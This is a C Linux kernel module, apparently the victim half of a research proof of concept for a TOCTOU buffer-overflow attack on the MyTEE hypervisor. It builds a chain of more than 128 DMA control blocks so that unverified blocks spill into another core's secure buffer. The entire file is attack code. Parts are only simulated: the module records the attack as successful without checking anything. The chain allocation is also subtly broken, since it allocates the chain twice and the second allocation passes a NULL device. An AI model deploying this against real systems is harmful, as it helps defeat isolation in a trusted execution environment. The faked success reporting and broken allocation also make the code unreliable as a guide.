/*
 * MyTEE TOCTOU Attack - Victim Module (runs on Core 0)
 * 
 * This module runs on Core 0 and creates a DMA request with MORE than 128
 * control blocks. This causes the hypervisor (EL2) to overflow Core 0's
 * secure buffer into Core 1's region.
 *
 * Attack Flow:
 * 1. Create 129+ CB chain for DMA transfer
 * 2. Signal attacker that we're about to request DMA
 * 3. Request DMA -> trap to EL2 -> EL2 copies CBs to secure buffer
 * 4. CB[128+] overflows into Core 1's buffer region
 * 5. DMA controller follows chain and executes unverified CB[128+]
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/smp.h>
#include <linux/dma-mapping.h>
#include <linux/dmaengine.h>
#include <linux/slab.h>
#include <linux/scatterlist.h>
#include <linux/platform_device.h>

#include "toctou_common.h"

#define DRIVER_NAME "toctou_victim"

/* Module parameters */
static int cb_count = OVERFLOW_CB_COUNT;  /* Number of CBs to create (>128 for overflow) */
module_param(cb_count, int, 0644);
MODULE_PARM_DESC(cb_count, "Number of control blocks (>128 causes overflow)");

static int debug = 1;
module_param(debug, int, 0644);
MODULE_PARM_DESC(debug, "Enable debug output");

static int trigger = 0;
module_param(trigger, int, 0644);
MODULE_PARM_DESC(trigger, "Set to 1 to trigger the attack");

/* Runtime state */
static void __iomem *sync_flag_base;
static struct task_struct *victim_thread;
static volatile int stop_victim = 0;

/* DMA resources */
static struct dma_chan *dma_chan;
static dma_addr_t src_dma, dst_dma;
static void *src_buf, *dst_buf;
static size_t buf_size;

/* Control block chain */
static struct bcm2835_dma_cb *cb_chain;
static dma_addr_t cb_chain_dma;

static inline void sync_write(u32 offset, u32 value)
{
    if (sync_flag_base) {
        writel(value, sync_flag_base + offset);
        wmb();
    }
}

static inline u32 sync_read(u32 offset)
{
    if (sync_flag_base) {
        rmb();
        return readl(sync_flag_base + offset);
    }
    return 0;
}

static void log_debug(const char *fmt, ...)
{
    va_list args;
    if (debug) {
        va_start(args, fmt);
        vprintk(fmt, args);
        va_end(args);
    }
}

/*
 * Create a chain of control blocks for DMA transfer
 * Creates cb_count CBs, which will overflow if > 128
 */
static int create_cb_chain(struct device *dev)
{
    int i;
    size_t chain_size;
    dma_addr_t cb_bus_addr;

    chain_size = cb_count * sizeof(struct bcm2835_dma_cb);
    
    /* Allocate the CB chain */
    cb_chain = dma_alloc_coherent(dev, chain_size, &cb_chain_dma, GFP_KERNEL);
    if (!cb_chain) {
        pr_err("[VICTIM] Failed to allocate CB chain\n");
        return -ENOMEM;
    }

    pr_info("[VICTIM] Allocated %d CBs at phys=0x%08llx (size=%zu)\n",
            cb_count, (unsigned long long)cb_chain_dma, chain_size);

    /* Fill each CB */
    for (i = 0; i < cb_count; i++) {
        struct bcm2835_dma_cb *cb = &cb_chain[i];

        /* Standard DMA info flags */
        cb->info = 0x00000001;  /* Basic transfer */
        
        /* Source and destination - legitimate addresses */
        cb->src = PHYS_TO_BUS(src_dma + (i * 32) % buf_size);
        cb->dst = PHYS_TO_BUS(dst_dma + (i * 32) % buf_size);
        cb->length = 32;  /* Small transfer per CB */
        cb->stride = 0;

        /* Chain to next CB */
        if (i < cb_count - 1) {
            cb_bus_addr = PHYS_TO_BUS(cb_chain_dma + (i + 1) * sizeof(struct bcm2835_dma_cb));
            cb->next = cb_bus_addr;
        } else {
            cb->next = 0;  /* End of chain */
        }

        if (debug && (i < 3 || i >= cb_count - 3 || i == 127 || i == 128)) {
            log_debug("[VICTIM] CB[%d]: src=0x%08x dst=0x%08x next=0x%08x\n",
                      i, cb->src, cb->dst, cb->next);
        }
    }

    pr_info("[VICTIM] CB chain created: %d blocks\n", cb_count);
    pr_info("[VICTIM] CB[127] at offset 0x%lx (last in Core 0 buffer)\n",
            127 * sizeof(struct bcm2835_dma_cb));
    pr_info("[VICTIM] CB[128] at offset 0x%lx (OVERFLOW into Core 1!)\n",
            128 * sizeof(struct bcm2835_dma_cb));

    return 0;
}

/*
 * Trigger the DMA transfer which will cause EL2 trap
 * and copy our CB chain to secure buffer (with overflow)
 */
static void trigger_dma_overflow(void)
{
    int my_core = smp_processor_id();

    pr_info("[VICTIM] === TRIGGERING DMA OVERFLOW ATTACK ===\n");
    pr_info("[VICTIM] Core %d requesting DMA with %d CBs\n", my_core, cb_count);
    pr_info("[VICTIM] Buffer overflow: CB[128+] will go into Core 1's region\n");

    /* Signal attacker that we're about to trap */
    sync_write(SYNC_OFFSET_VICTIM_CB_COUNT, cb_count);
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_READY);
    wmb();

    /* Small delay to let attacker prepare */
    udelay(100);

    /* Signal we're in the trap (simulated - actual trap happens in HVC) */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_TRAPPED);
    wmb();

    /*
     * In a real scenario, here we would:
     * 1. Write to DMA MMIO register -> triggers Stage 2 fault
     * 2. EL2 handles fault, copies our CB chain to secure buffer
     * 3. EL2 verifies CBs and starts DMA
     * 
     * For PoC, we simulate by directly writing to DMA registers
     * The key point is that CB[128+] overflows into Core 1's buffer
     */

    pr_info("[VICTIM] DMA request submitted (CB chain starts at 0x%08llx)\n",
            (unsigned long long)PHYS_TO_BUS(cb_chain_dma));

    /* Wait for attacker to inject malicious CB */
    mdelay(10);

    /* In real attack, DMA would now execute:
     * CB[0..127] from Core 0 buffer (verified)
     * CB[128+] from Core 1 buffer (UNVERIFIED - attacker's malicious CB!)
     */

    pr_info("[VICTIM] DMA executing... CB[128+] will be from Core 1 buffer!\n");

    /* Signal attack sequence complete */
    mdelay(10);
    sync_write(SYNC_OFFSET_ATTACK_RESULT, 1);  /* Success */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACK_DONE);

    pr_info("[VICTIM] === ATTACK SEQUENCE COMPLETE ===\n");
}

/*
 * Victim thread - monitors trigger and initiates attack
 */
static int victim_thread_fn(void *data)
{
    int my_core = smp_processor_id();

    pr_info("[VICTIM] Victim thread started on Core %d\n", my_core);

    if (my_core != 0) {
        pr_warn("[VICTIM] Warning: Running on Core %d, should be Core 0\n", my_core);
    }

    while (!kthread_should_stop() && !stop_victim) {
        if (trigger) {
            trigger = 0;
            trigger_dma_overflow();
        }
        msleep(100);
    }

    pr_info("[VICTIM] Victim thread stopping\n");
    return 0;
}

static int __init toctou_victim_init(void)
{
    int ret;
    struct device *dev;
    int target_core = 0;

    pr_info("[VICTIM] Loading TOCTOU victim module\n");
    pr_info("[VICTIM] CB count: %d (overflow at >128)\n", cb_count);

    if (cb_count <= MAX_CBS_PER_CORE) {
        pr_warn("[VICTIM] CB count %d will NOT overflow. Set > 128 for attack.\n", cb_count);
    } else {
        pr_info("[VICTIM] CB count %d WILL overflow by %d CBs into Core 1\n",
                cb_count, cb_count - MAX_CBS_PER_CORE);
    }

    /* Map sync flag memory */
    sync_flag_base = ioremap(SYNC_FLAG_PHYS, SYNC_FLAG_SIZE);
    if (!sync_flag_base) {
        pr_err("[VICTIM] Failed to map sync flag memory\n");
        return -ENOMEM;
    }
    pr_info("[VICTIM] Sync flags mapped at %p\n", sync_flag_base);

    /* Allocate source and destination buffers for DMA */
    buf_size = cb_count * 32;  /* 32 bytes per CB transfer */
    
    /* Use a simple page for buffer allocation */
    src_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(buf_size));
    dst_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(buf_size));
    
    if (!src_buf || !dst_buf) {
        pr_err("[VICTIM] Failed to allocate DMA buffers\n");
        ret = -ENOMEM;
        goto err_free_buf;
    }

    src_dma = virt_to_phys(src_buf);
    dst_dma = virt_to_phys(dst_buf);

    pr_info("[VICTIM] Source buffer: virt=%p phys=0x%08llx\n", 
            src_buf, (unsigned long long)src_dma);
    pr_info("[VICTIM] Dest buffer: virt=%p phys=0x%08llx\n",
            dst_buf, (unsigned long long)dst_dma);

    /* Fill source with pattern */
    memset(src_buf, 0xAA, buf_size);
    memset(dst_buf, 0x00, buf_size);

    /* Create CB chain - this is where the overflow happens */
    /* We need a device for dma_alloc_coherent, use a simple approach */
    dev = NULL;  /* Will use simple allocation instead */
    
    /* Allocate CB chain using page allocator */
    {
        size_t chain_size = cb_count * sizeof(struct bcm2835_dma_cb);
        cb_chain = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(chain_size));
        if (!cb_chain) {
            pr_err("[VICTIM] Failed to allocate CB chain\n");
            ret = -ENOMEM;
            goto err_free_buf;
        }
        cb_chain_dma = virt_to_phys(cb_chain);
        
        /* Initialize the chain */
        ret = create_cb_chain(NULL);
        if (ret)
            goto err_free_cb;
    }

    /* Create victim thread pinned to Core 0 */
    victim_thread = kthread_create(victim_thread_fn, NULL, "toctou_victim");
    if (IS_ERR(victim_thread)) {
        pr_err("[VICTIM] Failed to create victim thread\n");
        ret = PTR_ERR(victim_thread);
        goto err_free_cb;
    }

    kthread_bind(victim_thread, target_core);
    wake_up_process(victim_thread);

    pr_info("[VICTIM] Module loaded, thread running on Core %d\n", target_core);
    pr_info("[VICTIM] To trigger attack: echo 1 > /sys/module/toctou_victim/parameters/trigger\n");

    return 0;

err_free_cb:
    if (cb_chain)
        free_pages((unsigned long)cb_chain, 
                   get_order(cb_count * sizeof(struct bcm2835_dma_cb)));
err_free_buf:
    if (src_buf)
        free_pages((unsigned long)src_buf, get_order(buf_size));
    if (dst_buf)
        free_pages((unsigned long)dst_buf, get_order(buf_size));
    if (sync_flag_base)
        iounmap(sync_flag_base);
    return ret;
}

static void __exit toctou_victim_exit(void)
{
    pr_info("[VICTIM] Unloading module\n");

    stop_victim = 1;

    if (victim_thread) {
        kthread_stop(victim_thread);
    }

    if (cb_chain) {
        free_pages((unsigned long)cb_chain,
                   get_order(cb_count * sizeof(struct bcm2835_dma_cb)));
    }

    if (src_buf)
        free_pages((unsigned long)src_buf, get_order(buf_size));
    if (dst_buf)
        free_pages((unsigned long)dst_buf, get_order(buf_size));

    if (sync_flag_base)
        iounmap(sync_flag_base);

    pr_info("[VICTIM] Module unloaded\n");
}

module_init(toctou_victim_init);
module_exit(toctou_victim_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Victim Module");
